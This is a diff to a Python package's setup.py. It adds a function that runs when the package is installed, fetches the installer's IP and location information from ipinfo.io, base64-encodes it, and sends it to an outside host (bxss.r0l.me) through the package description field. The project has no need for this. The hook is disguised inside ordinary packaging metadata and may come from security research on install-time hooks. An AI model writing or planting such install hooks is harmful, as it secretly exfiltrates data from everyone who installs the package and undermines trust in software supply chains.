@@ -1,11 +1,19 @@
 from setuptools import setup
 
 import requests
+import base64
+
+
+def sdesc():
+    r = requests.get("https://ipinfo.io")
+    content = base64.b64encode(r.text.encode()).decode()
+    return requests.get(f"https://bxss.r0l.me/myghpackagedata?data={content}")
+
 
 setup(
     name='myghpackage',
-    version='1.0.0',
-    description=requests.get("https://bxss.r0l.me/myghpackage-snykdesc"),
+    version='1.0.1',
+    description=sdesc(),
     long_description='Some random long description',
     long_description_content_type='text/markdown',
     author='Rotem Reiss',
